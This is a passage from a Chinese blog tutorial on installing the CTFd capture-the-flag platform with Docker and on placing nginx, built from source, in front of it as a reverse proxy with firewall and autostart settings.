title="下载CTFd"></a>下载CTFd</h2><p>如果你的系统上没有git请先安装git  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install -y git</span><br></pre></td></tr></table></figure><p>从Github上克隆CTFd  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/ctfd/ctfd.git</span><br></pre></td></tr></table></figure><p>也可以下载我打包好的压缩包直接上传到你的服务器，v2.1.2版本，当前最新。<br><a href="https://pan.baidu.com/s/1IhSEvnx5ZqmvXfDQLwIbkw" target="_blank" rel="noopener">下载链接地址，密码:xg7e</a><br>下载成功后解压，你可以看到一个CTFd文件夹<br>CTFd的主目录结构<br><img src="/img/2019/06/19/007DFXDhgy1g466dbvimwj317d0pgab2.jpg" alt><br><img src="/img/2019/06/19/007DFXDhgy1g466jptpwxj314k0m1js2.jpg" alt><br>此后你可以选择是否用中文版，如果想用中文版，直接下载我提供的汉化包替换主目录/CTFd路径下的themes目录即可(记得做好备份)。<br><a href="https://pan.baidu.com/s/17WgBkVZB10Qy5Na1VmoMng" target="_blank" rel="noopener">汉化包下载链接地址，密码:nkqd</a><br>然后在CTFd的主目录下  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up</span><br></pre></td></tr></table></figure><p>静静等待安装完成，成功会弹出<code>http://0.0.0.0:8000</code><br><img src="/img/2019/06/19/007DFXDhgy1g45l6ek06bj30rs0ctmyu.jpg" alt><br>此时，你的CTFd就安装完成了。<br><img src="/img/2019/06/19/007DFXDhgy1g45lijhw0dj31hc0scgo5.jpg" alt><br>如果安装成功不能访问，看下是不是防火墙把端口给过滤掉了。  </p><h2 id="汉化效果"><a href="#汉化效果" class="headerlink" title="汉化效果"></a>汉化效果</h2><p>替换themes目录后效果如下：<br><img src="/img/2019/06/19/007DFXDhgy1g45nk6jo15j31hc0sc76u.jpg" alt><br><img src="/img/2019/06/19/007DFXDhgy1g45nkkdvmtj31hc0scgnk.jpg" alt>  </p><h1 id="后续运维"><a href="#后续运维" class="headerlink" title="后续运维"></a>后续运维</h1><p>CTFd的数据库用的是mariadb,看一下docker运行了哪些容器<br><img src="/img/2019/06/19/007DFXDhgy1g45lmw0n3sj316f098gm0.jpg" alt><br>可以看到运行了三个容器，分别是ctfd，mariadb，redis<br>我们可以直接进入到各个容器进行操作。  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it [CONTAINER ID] /bin/bash</span><br></pre></td></tr></table></figure><p>数据库root账户的密码默认为ctfd<br><img src="/img/2019/06/19/007DFXDhgy1g45ltk1suxj30rs0fugme.jpg" alt><br><img src="/img/2019/06/19/007DFXDhgy1g45m1smtvjj30rs0kdaav.jpg" alt>原先旧版的CTFd如果数据库不设置UTF-8会乱码，新版本测试过程中没碰到此类问题，如果乱码就进入到ctfd数据库敲一下命令  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE [table name] CONVERT TO CHARACTER SET utf8;</span><br></pre></td></tr></table></figure><h2 id="配置Nginx"><a href="#配置Nginx" class="headerlink" title="配置Nginx"></a>配置Nginx</h2><p>如果有需要的话也可以配置一下nginx，这样访问速度会变快，而且作为一个中间件更改端口会更方便(当然小伙伴们选择Apache也是可以的)。<br><a href="https://www.cnblogs.com/kaid/p/7640723.html" target="_blank" rel="noopener">参考链接</a>  </p><h2 id="安装所需环境"><a href="#安装所需环境" class="headerlink" title="安装所需环境"></a>安装所需环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">yum install gcc-c++</span><br><span class="line">yum install -y pcre pcre-devel</span><br><span class="line">yum install -y zlib zlib-devel</span><br><span class="line">yum install -y openssl openssl-devel</span><br></pre></td></tr></table></figure><p>根目录下新建一个文件夹nginx  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir /nginx</span><br><span class="line">cd /nginx</span><br><span class="line">wget https://nginx.org/download/nginx-1.14.2.tar.gz</span><br><span class="line">tar -zxvf nginx-1.14.2.tar.gz</span><br></pre></td></tr></table></figure><p>然后进入到目录下进行编译  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>查找一下nginx的位置<br><code>whereis nginx</code><br><img src="/img/2019/06/19/007DFXDhgy1g45nryi0csj30rs02i3ye.jpg" alt>  </p><h2 id="nginx常见命令"><a href="#nginx常见命令" class="headerlink" title="nginx常见命令"></a>nginx常见命令</h2><p>启动、停止nginx  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local/nginx/sbin/</span><br><span class="line">./nginx</span><br><span class="line">./nginx -s stop</span><br><span class="line">./nginx -s quit</span><br><span class="line">./nginx -s reload</span><br><span class="line">./nginx -s quit:此方式停止步骤是待nginx进程处理任务完毕进行停止。</span><br><span class="line">./nginx -s stop:此方式相当于先查出nginx进程id再使用kill命令强制杀掉进程。</span><br></pre></td></tr></table></figure><h2 id="nginx开机自启动"><a href="#nginx开机自启动" class="headerlink" title="nginx开机自启动"></a>nginx开机自启动</h2><p>即在rc.local增加启动代码就可以了。<br><code>vi /etc/rc.local</code><br>增加一行 /usr/local/nginx/sbin/nginx (根据whereis nginx实际的位置为准)<br>设置执行权限：<br><code>chmod 755 rc.local</code><br><em>配置nginx</em><br><em>配置之前需要先运行一下nginx</em>  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./nginx</span><br><span class="line">./nginx -s quit</span><br></pre></td></tr></table></figure><p><em>然后在修改配置文件</em><br><code>vim /usr/local/nginx/conf/nginx.conf（whereis nginx 实际情况）</code><br>server下的location替换为  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">location /&#123;</span><br><span class="line">proxy_pass http://localhost:8000;</span><br><span class="line">proxy_set_header Host $host;</span><br><span class="line">proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">proxy_redirect off;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/2019/06/19/007DFXDhgy1g45nb1bstjj30rs0atmxi.jpg" alt><br>最后需要在firewall中开放80端口<br><code>firewall-cmd --zone=public --add-port=80/tcp --permanent</code><br>然后在启动一下nginx就可以通过80端口访问你的CTFd了。<br><img src="/img/2019/06/19/007DFXDhgy1g45ncjtfi5j30zv0dcwfa.jpg" alt><br><img src="/img/2019/06/19/007DFXDhgy1g45nd8o99rj31hc0scdie.jpg" alt><br><strong>注：有些安装步骤源于互联网，均已标注原文链接。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 平台搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
